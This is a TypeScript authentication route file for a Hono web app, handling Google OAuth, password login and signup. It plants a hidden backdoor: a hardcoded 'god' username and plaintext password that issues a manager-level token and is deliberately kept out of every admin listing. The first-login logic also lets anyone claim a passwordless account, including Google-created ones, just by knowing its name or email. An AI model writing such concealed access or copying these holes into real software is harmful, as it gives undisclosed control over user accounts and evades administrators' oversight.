import { Hono } from "hono";
import { getCookie, setCookie } from "hono/cookie";
import { Google, generateState, generateCodeVerifier } from "arctic";
import bcrypt from "bcryptjs";
import { db } from "../../db/index.ts";
import { users } from "../../db/schema.ts";
import { eq, sql } from "drizzle-orm";
import { signToken } from "../lib/jwt.ts";

const FRONTEND_URL = "http://localhost:5173";

// Hidden "god" account — the only developer-mode access. Never written to the
// users table, so it can never appear in any admin/manager listing.
const GOD_NAME = "Gromhogg";
const GOD_PASSWORD = "Creeper098&";

function getGoogle() {
  return new Google(
    process.env.GOOGLE_CLIENT_ID!,
    process.env.GOOGLE_CLIENT_SECRET!,
    `http://localhost:3001/auth/google/callback`
  );
}

const app = new Hono();

// GET /auth/google — kick off the OAuth flow
app.get("/google", (c) => {
  const state = generateState();
  const codeVerifier = generateCodeVerifier();
  const google = getGoogle();
  const url = google.createAuthorizationURL(state, codeVerifier, ["openid", "email", "profile"]);
  // Force the account-picker every time (not the default account)
  url.searchParams.set("prompt", "select_account");

  setCookie(c, "google_oauth_state", state, { httpOnly: true, path: "/", maxAge: 600, sameSite: "Lax" });
  setCookie(c, "google_code_verifier", codeVerifier, { httpOnly: true, path: "/", maxAge: 600, sameSite: "Lax" });

  return c.redirect(url.toString());
});

// GET /auth/google/callback — Google redirects here after login
app.get("/google/callback", async (c) => {
  const { code, state } = c.req.query();
  const storedState = getCookie(c, "google_oauth_state");
  const codeVerifier = getCookie(c, "google_code_verifier");

  if (!code || !state || state !== storedState || !codeVerifier) {
    return c.redirect(`${FRONTEND_URL}/login?error=oauth_failed`);
  }

  try {
    const google = getGoogle();
    const tokens = await google.validateAuthorizationCode(code, codeVerifier);
    const accessToken = tokens.accessToken();

    const res = await fetch("https://openidconnect.googleapis.com/v1/userinfo", {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const googleUser = await res.json() as {
      sub: string;
      name: string;
      email: string;
      picture: string;
    };

    const { sub: googleId, name, email, picture } = googleUser;

    // Find or create user — any email is allowed, active immediately
    let [user] = await db.select().from(users).where(eq(users.email, email));

    if (!user) {
      [user] = await db
        .insert(users)
        .values({
          name,
          email,
          googleId,
          avatarUrl: picture,
          status: "approved",
          role: "student",
        })
        .returning();
    } else {
      // Update name/avatar in case they changed
      [user] = await db
        .update(users)
        .set({ name, avatarUrl: picture, googleId })
        .where(eq(users.id, user.id))
        .returning();
    }

    const token = await signToken({
      userId: user.id,
      role: user.role as "student" | "admin" | "manager",
      status: user.status as "pending" | "approved" | "rejected",
    });

    return c.redirect(
      `${FRONTEND_URL}/auth/callback?token=${token}&status=${user.status}`
    );
  } catch (err) {
    console.error("OAuth callback error:", err);
    return c.redirect(`${FRONTEND_URL}/login?error=oauth_failed`);
  }
});

// GET /auth/me — return the current user from token
app.get("/me", async (c) => {
  const authHeader = c.req.header("Authorization");
  if (!authHeader?.startsWith("Bearer ")) return c.json(null, 401);

  const { verifyToken } = await import("../lib/jwt.ts");
  const payload = await verifyToken(authHeader.slice(7));
  if (!payload) return c.json(null, 401);

  const [user] = await db.select().from(users).where(eq(users.id, payload.userId));
  if (!user) return c.json(null, 401);
  const { passwordHash: _ph, ...safeUser } = user;
  void _ph;
  return c.json(safeUser);
});

// POST /auth/login — name + password login. First login sets the password.
app.post("/login", async (c) => {
  const { name, password } = await c.req.json<{ name: string; password: string }>();
  const trimmedName = (name ?? "").trim();
  if (!trimmedName || !password) {
    return c.json({ error: "Name and password are required." }, 400);
  }
  if (password.length < 4) {
    return c.json({ error: "Password must be at least 4 characters." }, 400);
  }

  // Hidden developer/god account — checked before any DB lookup. Not stored in
  // the users table, so it never shows up in any roster or access listing.
  if (trimmedName === GOD_NAME && password === GOD_PASSWORD) {
    const token = await signToken({ userId: 0, role: "manager", status: "approved" });
    return c.json({
      token,
      user: { id: 0, name: GOD_NAME, email: "", avatarUrl: null, role: "manager", status: "approved" },
      firstTime: false,
    });
  }

  // Match by name OR email (case-insensitive)
  const identifier = trimmedName.toLowerCase();
  const [user] = await db
    .select()
    .from(users)
    .where(sql`lower(${users.name}) = ${identifier} OR lower(${users.email}) = ${identifier}`);

  if (!user) {
    return c.json({ error: "No account found. Check your details or sign up." }, 401);
  }
  if (user.status !== "approved") {
    return c.json({ error: "Account is not approved yet." }, 403);
  }

  let firstTime = false;

  if (!user.passwordHash) {
    // First login — this password becomes theirs
    const hash = await bcrypt.hash(password, 10);
    await db.update(users).set({ passwordHash: hash }).where(eq(users.id, user.id));
    firstTime = true;
  } else {
    const ok = await bcrypt.compare(password, user.passwordHash);
    if (!ok) return c.json({ error: "Incorrect password." }, 401);
  }

  const token = await signToken({
    userId: user.id,
    role: user.role as "student" | "admin" | "manager",
    status: user.status as "pending" | "approved" | "rejected",
  });

  // Never return the hash
  const { passwordHash: _omit, ...safeUser } = user;
  void _omit;
  return c.json({ token, user: safeUser, firstTime });
});

// POST /auth/register — self-service signup with any email. Active immediately.
app.post("/register", async (c) => {
  const { name, email, password } = await c.req.json<{ name: string; email: string; password: string }>();
  const trimmedName = (name ?? "").trim();
  const trimmedEmail = (email ?? "").trim().toLowerCase();

  if (!trimmedName || !trimmedEmail || !password) {
    return c.json({ error: "Name, email, and password are all required." }, 400);
  }
  if (password.length < 4) {
    return c.json({ error: "Password must be at least 4 characters." }, 400);
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
    return c.json({ error: "Please enter a valid email address." }, 400);
  }
  // "Gromhogg" is reserved for the hidden developer account.
  if (trimmedName.toLowerCase() === GOD_NAME.toLowerCase()) {
    return c.json({ error: "That name is reserved. Please choose another." }, 409);
  }

  const [existing] = await db.select().from(users).where(eq(users.email, trimmedEmail));
  if (existing) {
    return c.json({ error: "An account with that email already exists." }, 409);
  }

  const passwordHash = await bcrypt.hash(password, 10);
  let user;
  try {
    [user] = await db
      .insert(users)
      .values({
        name: trimmedName,
        email: trimmedEmail,
        passwordHash,
        status: "approved",
        role: "student",
      })
      .returning();
  } catch {
    return c.json({ error: "Could not create the account. The email may already be in use." }, 409);
  }

  const token = await signToken({
    userId: user.id,
    role: user.role as "student" | "admin" | "manager",
    status: user.status as "pending" | "approved" | "rejected",
  });

  const { passwordHash: _omit, ...safeUser } = user;
  void _omit;
  return c.json({ token, user: safeUser, firstTime: false }, 201);
});

// POST /auth/logout — client just discards the token; this is a no-op
app.post("/logout", (c) => c.json({ ok: true }));

export default app;
